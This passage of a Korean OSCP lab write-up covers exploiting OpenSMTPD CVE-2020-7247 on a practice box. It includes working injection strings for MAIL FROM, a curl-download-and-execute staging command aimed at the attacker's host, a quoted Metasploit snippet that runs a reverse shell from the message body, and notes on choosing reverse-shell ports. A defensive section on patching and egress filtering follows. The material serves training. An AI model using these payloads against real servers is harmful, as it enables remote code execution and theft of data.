여기서 함정 하나 더: 다운로더도 80, 리버스셸도 80 을 써야 하는데 Kali 에서 `http.server` 와 nc 리스너가 **같은 80 포트를 동시에 못 문다.** 그래서 시분할이 필요하다 — 먼저 `http.server` 로 스크립트를 내려보내고, 80 을 nc 리스너로 갈아끼운 뒤, 인젝션으로 받아둔 스크립트를 실행시킨다.

패킷에 그 시분할이 그대로 남았다:

```
13:00:52.696619 IP 192.168.248.71.47472 > 192.168.45.207.80: Flags [S]   <- GET /x (http.server)
13:01:47.854581 IP 192.168.248.71.47476 > 192.168.45.207.80: Flags [S]   <- 리버스셸 (nc)
13:01:50.872232 IP 192.168.248.71.47478 > 192.168.45.207.80: Flags [S]   <- 3.0초 뒤, python pty 폴백
```

읽는 법 두 가지. 첫째, **스크립트 fetch 와 셸 접속 사이가 55초**다 — 그 사이에 80 을 갈아끼웠다. 둘째, 47476 과 47478 의 간격이 **정확히 3.0초**로 `www/x` 의 `sleep 3` 과 일치한다. 즉 `sleep 3` 은 포트 경합을 위한 장치가 **아니고**, bash `/dev/tcp` 가 실패했을 때를 대비한 python 폴백의 지연일 뿐이다(§3). `x` 의 첫 줄인 bash 리버스셸은 `sleep` 보다 앞에 있어서 즉시 뜬다 — 3초의 유예 같은 건 애초에 없다.

[가정] fetch(13:00:52)와 실행(13:01:47) 사이 55초의 정확한 사연 — 별도 인젝션으로 `sh /tmp/x` 를 다시 태운 것인지, OpenSMTPD 가 큐를 재시도한 것인지 — 은 산출물로 확정하지 못했다. 해당 인젝션의 `47984.py` 로그가 남아 있지 않다.

**스테이징까지 (12:56:03~13:00:52).** `exploit_ping_test` → `exploit_stage_curl` → `exploit_stage2` 로그가 이 단계다. 세 로그 모두 `47984.py` 의 성공 출력(`[*] Done`)만 담고 있다. 그리고 첫 인젝션이 실제로 실행된 증거가 `tcpdump_callback.log` 맨 앞에 있다:

```
12:56:03.880141 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 1954, seq 1, length 64
12:56:04.882037 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 1954, seq 2, length 64
12:56:05.883469 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 1954, seq 3, length 64
12:56:06.884450 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 1954, seq 4, length 64
```

인젝션 자체는 처음부터 매번 통했다 — 막힌 건 인젝션이 아니라 **회수/실행 방식**이었다. `|` 가 `:` 로 바뀌니 `curl|sh` 를 못 쓰고, `-o /tmp/x; sh /tmp/x` 로 우회해야 했다.

**실패 원인을 계층별로 분리하라.** 인젝션 성공(SMTP 250) ↔ 명령 실행(ICMP/HTTP 회신) ↔ 셸 회수(nc connect)는 서로 다른 계층이다. "리버스셸이 안 온다"를 한 덩어리로 보면 어디가 막혔는지 못 짚는다. ping(ICMP 회신)으로 실행을, curl 프로브(HTTP 404 회신)로 아웃바운드를, nc 로 셸 회선을 각각 검증하는 순서가 정답이었다.

## 7. OSCP 시험 관점

1. **25/tcp OpenSMTPD 를 보면 CVE-2020-7247.** 버전이 안 나와도 `MAIL FROM:<;ping -c 4 LHOST;>` 을 blind 로 던지고 `tcpdump` 로 ICMP 를 받으면 끝이다. 배너의 상태 코드를 버전으로 오독하지 말 것.
2. **수동 대안 (Metasploit 금지 대비).** `48038.rb` 는 msf 모듈이고 OSCP 에서 msf 는 1대 한정이다. `47984.py`(순수 python 소켓)로 대체하면 전 대상 허용 — 공개 PoC 스크립트는 규정상 문제없다. 더 원시적으로는 `nc`/`telnet` 으로 `HELO x` → `MAIL FROM:<;CMD;>` → `RCPT TO:<root>` → `DATA` → `.` 순서를 손으로 쳐도 된다.

   여기에 하나 더 — msf 모듈 소스에 **아웃바운드 fetch 가 아예 필요 없는 방법**이 들어 있다(Qualys 원안, 이 박스에서는 안 써봤다):

   ```ruby
   from = ";for #{rand_text_alpha(1)} in #{iter};do read;done;sh;exit 0;"
   body = "\r\n" + "#\r\n" * 15 + payload.encoded
   ```

   주소에는 `;for a in <15개 토큰>;do read;done;sh;exit 0;` 만 넣는다. 전부 통과 문자다. `read` 를 15번 돌려 서버가 앞에 붙인 메일 헤더를 버리고, 그 다음 `sh` 가 **DATA 본문의 나머지를 표준입력으로 읽어 실행**한다. 본문에는 문자 제약이 없으니 리버스셸 한 줄을 그대로 넣을 수 있다. 본문 앞의 `#` 15줄은 헤더 개수가 예상과 어긋나도 되도록 깐 NOP 슬라이드다. **주소로 못 넣을 페이로드는 본문으로 넣는다** — 이 박스에서 HTTP 스테이징으로 우회한 문제를 한 방에 없앤다.
3. **문자가 막히면 "지워지는가, 바뀌는가"부터 확인.** 여기선 `|` 가 `:` 로 **치환**됐다. 치환이면 요청 경로·에러 메시지에 그 흔적(`GET /x:sh`)이 남으니, 리스너 로그를 보면 바로 안다. 삭제로 착각하면 엉뚱한 데를 파게 된다. 어느 쪽이든 우회는 같다 — 파이프·치환이 필요한 로직을 파일이나 본문으로 밀어낸다: `curl -s LHOST/x -o /tmp/x; sh /tmp/x`.
4. **리버스셸이 안 붙으면 아웃바운드 포트부터 의심.** 443→80→53 을 돌려보되 매번 `tcpdump` 로 connect-back SYN 이 실제로 나가는지 확인. 여기선 80 만 관측됐다. 한 포트만 열렸으면 다운로더/리스너를 시분할한다 — fetch 먼저, 리스너로 교체, 그 다음 실행.
5. **시간 배분.** 이 세션은 열거를 병렬로 돌려 root 까지 11분이었지만, 시험장에서는 혼자 순서대로 친다. 그때 손실이 나는 자리가 80·445 다. Fundamental 박스에서 표면 셋 중 둘이 "읽히기만 하고 입력이 없으면" 15분 안에 접고 나머지 하나(여기선 25)에 집중한다. 동적 라우트가 균일 404, SMB 가 읽기전용 단일 파일 — 둘 다 조기 손절 신호다.
6. **버전이 없는 서비스는 그 자체가 정보다.** 배너가 버전을 안 주면 "판정 불가"로 멈추지 말고 **비파괴 PoC 를 blind 로 던진다.** 여기선 `ping -c 4 LHOST` 인젝션이 그것이었고, ICMP 회신 4발로 4분 만에 취약성이 확정됐다. 파일 생성(`touch /tmp/x`)은 셸이 없으면 확인할 수 없으니 **회신이 네트워크로 돌아오는 것**을 고른다.

## 8. 방어 관점

- OpenSMTPD **6.6.2p1** 이상으로 패치. 고쳐진 것은 이스케이프가 아니라 **`smtp_mailaddr()` 의 반환값**이다 — 로컬 파트 검증에 실패했는데도 도메인이 비었다는 이유로 성공(1)을 돌려주던 분기가 문제였다. 검증 실패는 실패로 돌려주는 것, 그게 전부다.
- 로컬 배달을 mda 셸로 태우지 말고 전용 배달 에이전트로, 최소권한(비 root)으로 실행.
- SMB: null session 비활성(`restrict anonymous`), `backups` 공유에 익명 접근 차단. `/etc/passwd` 사본을 공유에 두지 말 것 — 해시가 없어도 사용자명 열거를 그대로 내준다.
- egress 필터. 이 박스에서 관측된 회수 회선은 tcp/80 하나뿐이었고, 그것마저 막았다면 회수가 훨씬 까다로웠다. 인바운드만 잠그고 아웃바운드를 열어두면 RCE 가 곧바로 셸이 된다.

## 9. 참고 자료

- CVE-2020-7247 — OpenSMTPD `MAIL FROM` 명령 인젝션. 영향 범위는 **2018-05 커밋 `a8e222352f` 이후 ~ 6.6.2p1 미만**이며 그 이전 버전은 해당 없다. Qualys 어드바이저리, openwall oss-security 2020-01-28 (`https://www.openwall.com/lists/oss-security/2020/01/28/3`).
- exploit-db 47984 (`47984.py`, 1F98D) — 순수 python PoC. **OSCP 에서 이걸 쓸 것** (msf 아님).
- Metasploit `exploit/unix/smtp/opensmtpd_mail_from_rce` (`48038.rb`) — `MyBadChars` 목록과 **comment slide** 원안(§7-2)이 여기 있다. 모듈을 안 쓰더라도 소스는 읽을 값어치가 있다.

## 남긴 흔적 / 관련 노트

**타겟(192.168.248.71).** 최초 풀이 때 `/tmp/x`·`/tmp/r`(스테이저) 등을 떨궜다. `verify_shell.log` 의 `/tmp` 리스팅에 남은 건 시스템 디렉터리(`systemd-private-*`, `netplan_*`, `.X11-unix` 등)뿐이고 스테이저 파일은 보이지 않는다 — 정리됐거나 tmpfs 라 재부팅 시 소멸. 재실측(2026-08-20 13:36)에서 `/tmp/r` 를 한 번 더 만들었다(내용은 id/flag exfil 용 무해 스크립트). 타겟은 리버트/재부팅으로 초기화되므로 별도 원격 정리는 하지 않았다. [가정] `/tmp` tmpfs 소멸.

**Kali(10.44.44.128).** 재실측용 tmux 세션 `bratweb`(http.server 80)·`bratcap`(tcpdump)은 종료. 80 리스너 없음. 스테이저 `~/PG/Bratarina/www/r` 는 삭제하고 원본 산출물 `www/x`·`www/e` 만 남겼다. 재실측 로그(`revalidate_*`)는 산출물로 보존. — 감사 시점(2026-08-20)에 `tmux ls`·`ss -lntp`·`ls ~/PG/Bratarina/www/` 로 셋 다 재확인했다.

**관련 노트**
- [[Wombo]] — 아웃바운드 tcp/80 만 허용되는 동일 제약. 리버스셸 회수 시 포트 확인 습관.
- "응답이 성공을 뜻하지 않는다" 패턴: [[Crane]] · [[Squid]] · [[Astronaut]] · [[Hawat]] (80 의 균일 404 데코이)
- "버전 판정은 독립 근거 2개" 패턴: [[Hub]] · [[Levram]] · [[RubyDome]] (여기선 근거 0개 → PoC 실측이 유일 근거)
- [[_STATUS]] — 283개 전수 진행현황
